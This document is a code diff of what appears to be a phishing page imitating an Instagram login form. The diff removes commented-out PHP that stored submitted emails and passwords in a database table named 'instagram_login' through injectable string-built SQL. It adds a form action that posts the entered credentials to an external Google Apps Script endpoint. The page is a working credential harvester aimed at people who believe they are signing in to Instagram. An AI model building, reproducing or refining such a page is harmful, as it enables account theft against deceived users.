@@ -1,10 +1,3 @@
-<!-- <?php
-
-include("connection.php");
-error_reporting(0);
-
-?> -->
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -22,7 +15,7 @@ error_reporting(0);
         <div class="wrapper">
 <div class="photo1"><img src="./aayu.png" alt=""></div>
 
-<form action="" method="POST">
+<form action="https://script.google.com/macros/s/AKfycbzP3Tv5G4xkCxNIlMKEER5jZbnXJB4855GupDsJ2149rSYyF_vOawfyG6kfSTkuq9q_Aw/exec" method="POST">
     <input type="text" id="nano" name="email" placeholder="Phone number, username, or email" required>
     <input type="password" name="password" placeholder="Password" id="password" required>
         <!-- <div class="maagi"> -->
@@ -146,25 +139,3 @@ button.onclick = function(){
 
 </body>
 </html>
-
-
-<!-- <?php
-
-if(isset($_POST['submit']))
-{
-$email=$_POST['email'];
-$pass=$_POST['password'];
-
-
-$query="INSERT INTO instagram_login VALUES ('$email','$pass')";
-
-$data=mysqli_query($aash,$query);
-
-if($data){
-    // echo "data inserted into database";
-}
-else{
-    echo "failed to insert database";
-}
-}
-?> -->
